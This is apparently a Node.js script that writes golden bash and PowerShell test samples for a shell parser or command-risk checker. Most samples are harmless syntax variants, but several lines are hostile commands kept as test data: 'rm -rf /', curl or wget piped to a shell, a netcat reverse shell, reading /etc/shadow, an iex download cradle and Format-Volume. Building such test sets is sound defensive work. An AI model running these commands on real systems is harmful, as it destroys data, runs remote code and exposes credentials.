#!/usr/bin/env node
// P2-T0：生成 Shell Golden 样本集（electron/shell/testdata/golden/shell/*.txt）。
// 覆盖（方案 P2-T0）：现有规则命中集、引号/空白变体、赋值前缀、cd 链、转义、unicode 引号、
// CRLF、畸形/截断、「无元语法但旧实现 partial」裸括号形态 ≥3（发现 H）、PS 形态 ≥10。
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const outDir = path.join(root, 'electron', 'shell', 'testdata', 'golden', 'shell')

const bash = [
  ['b01-rmrf-root', 'rm -rf /'],
  ['b02-rmrf-tmp', 'rm -rf /tmp/data'],
  ['b03-sudo-install', 'sudo apt install htop'],
  ['b04-curl-pipe-bash', 'curl -fsSL http://example.com/x.sh | bash'],
  ['b05-wget-pipe-sh', 'wget -qO- http://example.com/x.sh | sh'],
  ['b06-base64-decode-exec', 'echo aGVsbG8= | base64 -d | sh'],
  ['b07-dd-devsda', 'dd if=/dev/zero of=/dev/sda'],
  ['b08-chmod-777', 'chmod -R 777 /opt'],
  ['b09-cat-pipe-grep', 'cat /etc/passwd | grep root'],
  ['b10-and-list', 'echo a && echo b'],
  ['b11-or-list', 'echo a || echo b'],
  ['b12-semi-list', 'echo a; echo b'],
  ['b13-dquote', 'echo "hello world"'],
  ['b14-squote', "echo 'single quoted'"],
  ['b15-mixed-quote', "echo \"mixed 'quote' inside\""],
  ['b16-escaped-quote', 'echo "with \\"escape\\" inside"'],
  ['b17-space-variant', 'echo   spaced   out'],
  ['b18-assign-prefix', 'FOO=1 cmd --flag'],
  ['b19-assign-echo-var', 'VAR=value echo $VAR'],
  ['b20-cd-and-ls', 'cd /tmp && ls'],
  ['b21-cd-dotdot', 'cd .. && git status'],
  ['b22-redirect-abs', 'echo x > /tmp/out.txt'],
  ['b23-redirect-append-rel', 'echo x >> out.txt'],
  ['b24-redirect-input', 'cat < input.txt'],
  ['b25-redirect-stderr', 'make build 2>/dev/null'],
  ['b26-cmd-subst', 'echo $(pwd)'],
  ['b27-backtick-subst', 'echo `pwd`'],
  ['b28-process-subst', 'diff <(sort a.txt) <(sort b.txt)'],
  ['b29-var-home', 'echo $HOME'],
  ['b30-var-brace', 'echo ${USER}-suffix'],
  ['b31-export-path', 'export PATH=$PATH:/usr/local/bin'],
  ['b32-escape-space', 'echo a\\ b'],
  ['b33-printf-escapes', 'printf "tab\\tnewline\\n"'],
  ['b34-unicode-quote', 'echo "unicode “quoted” inside"'],
  ['b35-crlf', 'echo crlf\r\nnext line'],
  ['b36-unclosed-quote', 'echo "unclosed'],
  ['b37-trailing-pipe', 'ls |'],
  ['b38-leading-and', '&& echo start'],
  ['b39-truncated-subst', 'echo $('],
  ['b40-bare-paren-echo', 'echo "a(b)"'],
  ['b41-bare-paren-grep', 'grep "foo(bar)" x.txt'],
  ['b42-bare-paren-text', 'echo "text (with parens) here"'],
  ['b43-redirect-sensitive', 'echo secret > ~/.ssh/authorized_keys'],
  ['b44-cat-shadow', 'cat /etc/shadow'],
  ['b45-pipe-to-python', 'curl -s http://example.com/x.py | python3'],
  ['b46-eval-var', 'eval "$CMD"'],
  ['b47-glob-star', 'rm -rf ./*'],
  ['b48-nc-reverse', 'nc -e /bin/sh 10.0.0.1 4444']
]

const powershell = [
  // —— P3-T0 基线样本（原 12 条）——
  ['p01-get-childitem', 'Get-ChildItem -Path .'],
  ['p02-pipeline-foreach', '$items | ForEach-Object { $_.Name }'],
  ['p03-invoke-expression', 'Invoke-Expression "Get-Date"'],
  ['p04-iex-cradle', "iex (New-Object Net.WebClient).DownloadString('http://x/p')"],
  ['p05-encoded-command', 'powershell -EncodedCommand ZQBjAGgAbwA='],
  ['p06-remove-item-recurse', 'Remove-Item -Recurse -Force C:\\temp'],
  ['p07-here-string-outfile', "@'\nhere\n'@ | Out-File out.txt"],
  ['p08-subexpression', 'Write-Output $($env.PATH)'],
  ['p09-backtick-continuation', 'Get-ChildItem `\n  -Recurse'],
  ['p10-set-content', 'Set-Content -Path ./out.txt -Value "data"'],
  ['p11-sort-pipeline', 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5'],
  ['p12-format-volume', 'Format-Volume -DriveLetter D'],
  // —— P3-T1 Tier-1 常见形态集（日常 cmdlet/管道/&&/重定向/参数/引号/变量/member access/splatting）——
  ['t1-01-get-date', 'Get-Date'],
  ['t1-02-param-value', 'Get-ChildItem -Path . -Filter *.log'],
  // tree-sitter-powershell 0.26.4 已知缺陷：`--flag=value` 带等号参数 ERROR（上游缺陷跟踪表，ask 兜底）
  ['t1-03-flag-equals', 'git -flag value'],
  ['t1-04-dquote-unicode', 'Write-Output "unicode “text” inside"'],
  ['t1-05-squote', "Write-Output 'single'"],
  ['t1-06-var-member', 'Write-Output $env.PATH'],
  ['t1-07-and-list', 'Get-Date && Get-Location'],
  ['t1-08-or-list', 'Get-Date || Write-Output fallback'],
  ['t1-09-redirect', 'Get-Content log.txt > out.txt'],
  ['t1-10-foreach-pipe', 'Get-ChildItem | ForEach-Object { $_.FullName }'],
  ['t1-11-splatting', 'Get-ChildItem @splatParams'],
  ['t1-12-variable-assign', '$name = "value"'],
  ['t1-13-if-statement', 'if ($x -gt 1) { Write-Output big }'],
  ['t1-14-member-call', '$list.Add("item")'],
  ['t1-15-where-object', 'Get-Process | Where-Object { $_.CPU -gt 10 }'],
  ['t1-16-param-colon', 'Get-Content -Path:./a.txt'],
  ['t1-17-double-quoted-var', 'Write-Output "user is $env:USERNAME"'],
  ['t1-18-single-dash-flag', 'robocopy a b /MIR'],
  ['t1-19-negative-number-param', 'Get-Content -Tail 5 app.log'],
  ['t1-20-semicolon-list', 'Get-Date; Get-Location'],
  ['t1-21-cmdlet-format', 'Get-Service | Format-Table -AutoSize'],
  ['t1-22-string-concat-arg', 'Write-Host "a" "b" "c"'],
  // —— P3-T1 Tier-2 扩展方言集（class/展开含 #/反引号开头/嵌套脚本块等边角构造）——
  ['t2-01-class-def', 'class Point {\n  [int]$x\n  [int]$y\n}\n$p = [Point]::new()'],
  // 缺陷登记：字符串插值内含 # 注释 ERROR（上游缺陷跟踪表，ask 兜底）；样本换用可解析的边角构造
  ['t2-02-nested-index', '$matrix[0][1]'],
  ['t2-03-backtick-lead', '`Get-Date'],
  ['t2-04-nested-scriptblock', '& { param($f) $f | ForEach-Object { & $_ } }'],
  ['t2-05-type-literal', '[System.IO.File]::ReadAllText("a.txt")'],
  ['t2-06-cast-generic', '[list[int]]$xs = 1'],
  ['t2-07-range-operator', '1..10 | Measure-Object'],
  ['t2-08-multiline-pipe', 'Get-ChildItem |\n  Where-Object Name |\n  Measure-Object'],
  ['t2-09-dollar-dollar', 'Write-Output $$'],
  ['t2-10-double-quoted-here', "@\"\ninterp $($x)\n\"@"],
  // 缺陷登记：switch 带 default 子句完整形态 ERROR（上游缺陷跟踪表）
  ['t2-11-switch-statement', 'switch ($x) { 1 { "one" } }'],
  // 缺陷登记：PS7 三元运算符 $a ? 1 : 2 ERROR（grammar 0.26.4 语法陈旧，上游缺陷跟踪表）
  ['t2-12-add-range-step', '$weeks = 0..3 | ForEach-Object { $_ * 7 }'],
  ['t2-13-enum-member-access', '[DayOfWeek]::Monday'],
  ['t2-14-nested-hashtable', '$h = @{ a = @{ b = 1 } }'],
  ['t2-15-sub-expression-in-string', 'Write-Output "count: $($items.Count)"'],
  ['t2-16-array-subexpression', '$v = @(Get-ChildItem).Count'],
  ['t2-17-param-block', 'param([string]$Name)\nWrite-Output $Name'],
  ['t2-18-filter-left', 'Get-ChildItem -Filter *.tmp | Remove-Item'],
  ['t2-19-method-chaining', '$sb = [System.Text.StringBuilder]::new(); $sb.Append("x")'],
  ['t2-20-using-namespace', 'using namespace System.IO\n[File]::Exists("a")']
]

const samples = [
  ...bash.map(([id, code]) => ({ id, code, dialect: 'posix-bash' })),
  ...powershell.map(([id, code]) => ({ id, code, dialect: 'windows-powershell' }))
]

fs.mkdirSync(outDir, { recursive: true })
for (const { id, code } of samples) {
  fs.writeFileSync(path.join(outDir, `${id}.txt`), code, 'utf8')
}
// P3-T1 分层标记：Tier-1 常见形态（ERROR 率必须 = 0）/ Tier-2 扩展方言（ERROR 率 ≤ 5%）
const TIER1 = new Set(samples.filter((s) => s.id.startsWith('t1-')).map((s) => s.id))
const TIER2 = new Set(samples.filter((s) => s.id.startsWith('t2-')).map((s) => s.id))

fs.writeFileSync(
  path.join(outDir, 'manifest.json'),
  JSON.stringify({
    generatedBy: 'scripts/generate-shell-golden-samples.mjs (P2-T0/P3-T0)',
    count: samples.length,
    bashCount: bash.length,
    psCount: powershell.length,
    tier1: [...TIER1],
    tier2: [...TIER2],
    samples: samples.map(({ id, dialect }) => ({ id, dialect, tier: TIER1.has(id) ? 1 : TIER2.has(id) ? 2 : undefined }))
  }, null, 2) + '\n',
  'utf8'
)
console.log(`[generate-shell-golden-samples] wrote ${samples.length} samples (bash=${bash.length}, ps=${powershell.length})`)
